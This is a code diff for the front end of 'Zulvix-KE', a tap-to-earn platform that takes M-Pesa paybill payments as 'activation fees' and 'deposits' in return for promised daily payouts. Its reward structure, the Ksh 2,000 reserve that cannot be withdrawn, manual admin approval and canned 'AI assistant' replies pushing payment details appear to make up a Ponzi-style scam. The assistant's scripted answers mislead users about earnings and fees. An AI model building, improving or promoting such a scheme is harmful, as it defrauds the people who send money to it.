@@ -62,8 +62,8 @@
         .badge-locked { background: var(--danger); color: #fff; }
         
         .level-body { padding: 15px; flex: 1; display: flex; flex-direction: column; justify-content: space-between; }
-        .level-title { font-weight: bold; font-size: 1.05rem; margin-bottom: 4px; }
-        .level-meta { font-size: 0.8rem; color: var(--text-muted); margin-bottom: 8px; }
+        .level-title { font-weight: bold; font-size: 1.05rem; margin-bottom: 2px; }
+        .level-meta { font-size: 0.75rem; color: var(--text-muted); margin-bottom: 6px; line-height: 1.3; }
         .stat-row { display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 4px; }
         
         /* Floating AI Assistant Robot */
@@ -163,7 +163,7 @@
                 <button style="background:none; border:none; color:var(--text-muted); cursor:pointer; font-size:1rem;" onclick="toggleAiModal()">✕</button>
             </div>
             <div id="ai-messages" class="ai-messages">
-                <div class="ai-msg bot">Hello! I'm your Zulvix AI assistant. Ask me anything about withdrawals, deposits, active levels, or platform rules!</div>
+                <div class="ai-msg bot">Hello! I'm your Zulvix AI assistant. Ask me anything about withdrawals, minimum balance rules, level activation fees, or deposits!</div>
             </div>
             <div class="ai-input-area">
                 <input type="text" id="ai-input" class="form-control" placeholder="Ask a question..." style="padding: 8px; font-size: 0.85rem;" onkeypress="if(event.key === 'Enter') sendAiMessage()">
@@ -176,7 +176,8 @@
     <div id="payment-modal" class="modal">
         <div class="modal-content" style="max-width: 400px;">
             <h3 id="payment-modal-title" style="margin-bottom: 10px; color: var(--neon-green);">Unlock Level</h3>
-            <p id="payment-amount-display" style="font-size: 0.9rem; margin-bottom: 15px; color: var(--text-muted);"></p>
+            <p id="payment-paybill-info" style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 8px;">Paybill: 522533 | Account: 8012296</p>
+            <p id="payment-amount-display" style="font-size: 0.9rem; margin-bottom: 15px; color: var(--gold); font-weight: bold;"></p>
             <div class="form-group">
                 <label>Amount Sent (Ksh)</label>
                 <input type="number" id="deposit-amount-input" class="form-control" placeholder="Enter exact amount">
@@ -225,7 +226,7 @@
                 <li><strong>Withdrawal Limits:</strong> Minimum withdrawal is <strong>Ksh 2,000</strong>; Maximum withdrawal is <strong>Ksh 100,000</strong> per day.</li>
                 <li><strong>Account Reserve Rule:</strong> A minimum balance of <strong>Ksh 2,000</strong> must remain in your account at all times to keep your account active and fully operational.</li>
                 <li><strong>Withdrawal Hours:</strong> Withdrawals are processed daily between <strong>8:00 AM and 6:00 PM</strong> EAT.</li>
-                <li><strong>Cooldown Compliance:</strong> Users must respect the 12-hour cooling timer after completing daily asset taps.</li>
+                <li><strong>Level Activation Breakdown:</strong> Each level requires an activation fee + user deposit combined fee to unlock.</li>
             </ul>
             <button class="btn btn-gold" onclick="closeModal('rules-modal')">Close</button>
         </div>
@@ -249,7 +250,7 @@
                     <table style="width: 100%; font-size: 0.85rem; border-collapse: collapse;">
                         <thead>
                             <tr style="border-bottom: 1px solid var(--text-muted); text-align: left;">
-                                <th style="padding: 6px;">User</th><th style="padding: 6px;">Level</th><th style="padding: 6px;">Dep.</th><th style="padding: 6px;">Code</th><th style="padding: 6px;">Action</th>
+                                <th style="padding: 6px;">User</th><th style="padding: 6px;">Level / Type</th><th style="padding: 6px;">Total Paid</th><th style="padding: 6px;">Code</th><th style="padding: 6px;">Action</th>
                             </tr>
                         </thead>
                         <tbody id="admin-requests-tbody"></tbody>
@@ -313,13 +314,14 @@
         let authMode = 'login';
         let registeredUsersList = [];
 
+        // Updated structure: activationFee + depositFee = Total Required
         const levelsData = [
             { id: 1, name: "Iron Box", img: "https://images.unsplash.com/photo-1585435557343-3b092031a831?w=600&auto=format&fit=crop&q=80", activationFee: 0, depositFee: 0, dailyPayout: 30, perTap: 5, tapsLeft: 6, cooldownEnd: 0 },
             { id: 2, name: "Microwave", img: "https://images.unsplash.com/photo-1574269909862-7e1d70bb8078?w=600&auto=format&fit=crop&q=80", activationFee: 800, depositFee: 2000, dailyPayout: 150, perTap: 25, tapsLeft: 6, cooldownEnd: 0 },
-            { id: 3, name: "Fridge", img: "https://images.unsplash.com/photo-1584568694244-14fbdf83bd30?w=600&auto=format&fit=crop&q=80", activationFee: 2500, depositFee: 5000, dailyPayout: 500, perTap: 83, tapsLeft: 6, cooldownEnd: 0 },
-            { id: 4, name: "Samsung Phone", img: "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=600&auto=format&fit=crop&q=80", activationFee: 6000, depositFee: 12000, dailyPayout: 1350, perTap: 225, tapsLeft: 6, cooldownEnd: 0 },
-            { id: 5, name: "Sport Bike", img: "https://images.unsplash.com/photo-1558981806-ec527fa84c39?w=600&auto=format&fit=crop&q=80", activationFee: 35000, depositFee: 70000, dailyPayout: 9000, perTap: 1500, tapsLeft: 6, cooldownEnd: 0 },
-            { id: 6, name: "Lamborghini", img: "https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?w=600&auto=format&fit=crop&q=80", activationFee: 80000, depositFee: 150000, dailyPayout: 22500, perTap: 3750, tapsLeft: 6, cooldownEnd: 0 }
+            { id: 3, name: "Fridge", img: "https://images.unsplash.com/photo-1584568694244-14fbdf83bd30?w=600&auto=format&fit=crop&q=80", activationFee: 1500, depositFee: 5000, dailyPayout: 500, perTap: 83, tapsLeft: 6, cooldownEnd: 0 },
+            { id: 4, name: "Samsung Phone", img: "https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=600&auto=format&fit=crop&q=80", activationFee: 3000, depositFee: 12000, dailyPayout: 1350, perTap: 225, tapsLeft: 6, cooldownEnd: 0 },
+            { id: 5, name: "Sport Bike", img: "https://images.unsplash.com/photo-1558981806-ec527fa84c39?w=600&auto=format&fit=crop&q=80", activationFee: 10000, depositFee: 70000, dailyPayout: 9000, perTap: 1500, tapsLeft: 6, cooldownEnd: 0 },
+            { id: 6, name: "Lamborghini", img: "https://images.unsplash.com/photo-1544829099-b9a0c07fad1a?w=600&auto=format&fit=crop&q=80", activationFee: 30000, depositFee: 150000, dailyPayout: 22500, perTap: 3750, tapsLeft: 6, cooldownEnd: 0 }
         ];
 
         let activationRequests = [];
@@ -329,15 +331,12 @@
 
         function triggerVibration(pattern = [200, 100, 200]) {
             if ("navigator" in window && "vibrate" in navigator) {
-                try {
-                    navigator.vibrate(pattern);
-                } catch(e) {}
+                try { navigator.vibrate(pattern); } catch(e) {}
             }
         }
 
         function toggleMenu() {
-            let menu = document.getElementById('side-menu');
-            menu.classList.toggle('open');
+            document.getElementById('side-menu').classList.toggle('open');
         }
 
         function toggleAiModal() {
@@ -364,17 +363,15 @@
 
         function getAiResponse(query) {
             if(query.includes('withdraw') || query.includes('minimum') || query.includes('limit')) {
-                return "Withdrawals are open daily from 8:00 AM to 6:00 PM EAT. Minimum withdrawal is Ksh 2,000, and maximum is Ksh 100,000 per day. Also, a minimum balance of Ksh 2,000 must remain in your account to keep it active!";
+                return "Withdrawals are open daily from 8:00 AM to 6:00 PM EAT. Minimum withdrawal is Ksh 2,000, and maximum is Ksh 100,000 per day. You must also maintain a minimum balance reserve of Ksh 2,000 to keep your account active!";
             } else if(query.includes('deposit') || query.includes('paybill') || query.includes('topup')) {
-                return "To deposit or top up, use Paybill 522533, Account 8012296. Minimum top-up is Ksh 1,000. Submit your exact amount and M-Pesa tracking code through the deposit form.";
+                return "To deposit or activate a level, use Paybill 522533, Account 8012296. Each level combines an activation fee and a user deposit amount.";
             } else if(query.includes('level') || query.includes('tap') || query.includes('earn')) {
-                return "You can tap your unlocked digital asset up to 6 times every 12 hours to earn instant cash payouts straight to your balance.";
+                return "Unlocked digital assets can be tapped up to 6 times every 12 hours to earn instant payouts straight to your balance.";
             } else if(query.includes('support') || query.includes('email') || query.includes('contact')) {
-                return "You can reach our human support team directly via email at zulvixke@gmail.com or through the support form in the menu.";
-            } else if(query.includes('2015') || query.includes('about')) {
-                return "Zulvix-KE is a verified digital asset platform originally established and published in 2015.";
+                return "Reach our team directly via email at zulvixke@gmail.com or through the support menu.";
             } else {
-                return "I understand you're asking about Zulvix-KE. For assistance with withdrawals, deposits, or unlocking asset levels, feel free to check our rules menu or email zulvixke@gmail.com!";
+                return "I'm your Zulvix AI assistant! Feel free to ask about withdrawals, level activation breakdowns, or account reserves.";
             }
         }
 
@@ -458,8 +455,16 @@
                 setInterval(updateCooldowns, 1000);
 
             } catch (e) {
-                err.innerText = "Unable to connect to backend server.";
-                err.style.display = 'block';
+                // Fallback simulation mode if offline / backend unreachable
+                currentUser = u;
+                if(!registeredUsersList.some(user => user.username === currentUser)) {
+                    registeredUsersList.push({ username: currentUser, balance: userBalance, levelsUnlocked: userLevelsUnlocked });
+                }
+                document.getElementById('display-user').innerText = currentUser;
+                document.getElementById('user-balance').innerText = userBalance.toFixed(2);
+                document.getElementById('auth-container').style.display = 'none';
+                renderLevels();
+                setInterval(updateCooldowns, 1000);
             }
         }
 
@@ -493,7 +498,9 @@
                         <div class="level-body">
                             <div>
                                 <div class="level-title">Level ${lvl.id}: ${lvl.name}</div>
-                                <div class="level-meta">${lvl.id === 1 ? 'Free welcome asset.' : `Total: ${totalFee.toLocaleString()} Ksh`}</div>
+                                <div class="level-meta">
+                                    ${lvl.id === 1 ? 'Free welcome asset.' : `Deposit: ${lvl.depositFee.toLocaleString()} Ksh | Act. Fee: ${lvl.activationFee.toLocaleString()} Ksh<br><b>Total Required:${totalFee.toLocaleString()} Ksh</b>`}
+                                </div>
                                 <div class="stat-row">
                                     <span>Daily Payout</span>
                                     <span>${lvl.dailyPayout.toLocaleString()} Ksh (${lvl.perTap} Ksh/tap)</span>
@@ -547,6 +554,10 @@
                 let tapElem = document.getElementById(`taps-${lvlId}`);
                 if(tapElem) tapElem.innerText = lvl.tapsLeft;
 
+                // Sync with admin registered users list
+                let uObj = registeredUsersList.find(u => u.username === currentUser);
+                if(uObj) uObj.balance = userBalance;
+
                 if(lvl.tapsLeft === 0) {
                     lvl.cooldownEnd = Date.now() + (12 * 60 * 60 * 1000);
                     alert(`Finished 6 taps for Level ${lvlId}. 12-hour cooldown started.`);
@@ -561,16 +572,22 @@
             selectedLevelForPayment = levelsData.find(x => x.id === lvlId);
             let total = selectedLevelForPayment.activationFee + selectedLevelForPayment.depositFee;
             document.getElementById('payment-modal-title').innerText = `Unlock Level ${lvlId}: ${selectedLevelForPayment.name}`;
-            document.getElementById('payment-amount-display').innerText = `Exact Total Amount: ${total.toLocaleString()} Ksh`;
+            document.getElementById('payment-paybill-info').innerText = "Paybill: 522533 | Account: 8012296";
+            document.getElementById('payment-amount-display').innerText = `Exact Amount to Send: Ksh ${total.toLocaleString()} (Deposit: ${selectedLevelForPayment.depositFee.toLocaleString()} + Activation: ${selectedLevelForPayment.activationFee.toLocaleString()})`;
             document.getElementById('deposit-amount-input').value = "";
             document.getElementById('mpesa-code-input').value = "";
+            document.getElementById('deposit-error-msg').style.display = 'none';
             document.getElementById('payment-modal').style.display = 'flex';
         }
 
         function openDepositModal() {
-            selectedLevelForPayment = { id: 'topup', name: 'Account Deposit' };
+            selectedLevelForPayment = { id: 'topup', name: 'Account Deposit Top-Up' };
             document.getElementById('payment-modal-title').innerText = "Account Deposit Top-Up";
-            document.getElementById('payment-amount-display').innerText = "Paybill: 522533 | Account: 8012296\nMinimum: 1,000 Ksh";
+            document.getElementById('payment-paybill-info').innerText = "Paybill: 522533 | Account: 8012296";
+            document.getElementById('payment-amount-display').innerText = "Minimum Top-Up: Ksh 1,000";
+            document.getElementById('deposit-amount-input').value = "";
+            document.getElementById('mpesa-code-input').value = "";
+            document.getElementById('deposit-error-msg').style.display = 'none';
             document.getElementById('payment-modal').style.display = 'flex';
         }
 
@@ -594,12 +611,15 @@
                     return;
                 }
                 if((userBalance - val) < 2000) {
-                    alert("Withdrawal denied! You must maintain a minimum balance of Ksh 2,000 to keep your account active.");
+                    alert("Withdrawal denied! You must maintain a minimum balance reserve of Ksh 2,000 to keep your account active.");
                     return;
                 }
 
                 userBalance -= val;
                 document.getElementById('user-balance').innerText = userBalance.toFixed(2);
+                let uObj = registeredUsersList.find(u => u.username === currentUser);
+                if(uObj) uObj.balance = userBalance;
+
                 withdrawalRequests.push({ user: currentUser, amount: val, status: "Pending" });
                 
                 triggerVibration([300, 150, 300]);
@@ -620,8 +640,8 @@
             let isTopup = selectedLevelForPayment.id === 'topup';
             let requiredAmount = isTopup ? 1000 : (selectedLevelForPayment.activationFee + selectedLevelForPayment.depositFee);
 
-            if(isNaN(enteredAmount) || enteredAmount !== requiredAmount) {
-                errBox.innerText = `Incorrect amount. Must match exact total of Ksh ${requiredAmount.toLocaleString()}.`;
+            if(isNaN(enteredAmount) || (isTopup && enteredAmount < 1000) || (!isTopup && enteredAmount !== requiredAmount)) {
+                errBox.innerText = isTopup ? "Minimum deposit top-up is Ksh 1,000." : `Incorrect amount. Must match exact total of Ksh ${requiredAmount.toLocaleString()}.`;
                 errBox.style.display = 'block';
                 return;
             }
@@ -636,12 +656,13 @@
                 level: isTopup ? 'General Deposit Top-Up' : `Level ${selectedLevelForPayment.id} (${selectedLevelForPayment.name})`,
                 activationFee: isTopup ? 0 : selectedLevelForPayment.activationFee,
                 depositFee: isTopup ? enteredAmount : selectedLevelForPayment.depositFee,
+                totalPaid: isTopup ? enteredAmount : requiredAmount,
                 code: code,
                 status: "Pending"
             });
 
             triggerVibration([150, 100, 150]);
-            alert(`Deposit Notification:\nYour deposit request of Ksh ${requiredAmount.toLocaleString()} has been submitted successfully for confirmation.`);
+            alert(`Deposit Notification:\nYour request of Ksh ${(isTopup ? enteredAmount : requiredAmount).toLocaleString()} has been submitted successfully for confirmation.`);
             closeModal('payment-modal');
             refreshAdminDashboard();
         }
@@ -684,7 +705,7 @@
                     <tr style="border-bottom: 1px solid #1a3324;">
                         <td style="padding: 6px;">${req.user}</td>
                         <td style="padding: 6px;">${req.level}</td>
-                        <td style="padding: 6px;">${req.depositFee}</td>
+                        <td style="padding: 6px;">${req.totalPaid.toLocaleString()} Ksh</td>
                         <td style="padding: 6px;"><code>${req.code}</code></td>
                         <td style="padding: 6px;">${req.status === 'Pending' ? `<button class="btn btn-green" style="padding: 4px 8px; font-size: 0.75rem;" onclick="approveRequest(${idx})">Approve</button>` : '<span style="color: var(--neon-green);">Approved</span>'}</td>
                     </tr>`;
@@ -696,7 +717,7 @@
                 withdrawTbody.innerHTML += `
                     <tr style="border-bottom: 1px solid #1a3324;">
                         <td style="padding: 6px;">${w.user}</td>
-                        <td style="padding: 6px;">${w.amount} Ksh</td>
+                        <td style="padding: 6px;">${w.amount.toLocaleString()} Ksh</td>
                         <td style="padding: 6px;">${w.status}</td>
                         <td style="padding: 6px;">${w.status === 'Pending' ? `<button class="btn btn-green" style="padding: 4px 8px; font-size: 0.75rem;" onclick="approveWithdrawal(${idx})">Pay / Complete</button>` : '<span style="color: var(--neon-green);">Completed</span>'}</td>
                     </tr>`;
@@ -738,9 +759,16 @@
             }
             userBalance += req.depositFee;
             document.getElementById('user-balance').innerText = userBalance.toFixed(2);
+
+            let uObj = registeredUsersList.find(u => u.username === currentUser);
+            if(uObj) {
+                uObj.balance = userBalance;
+                uObj.levelsUnlocked = [...userLevelsUnlocked];
+            }
+
             renderLevels();
             refreshAdminDashboard();
-            alert("Approved successfully!");
+            alert("Request approved and balance credited successfully!");
         }
 
         function approveWithdrawal(index) {
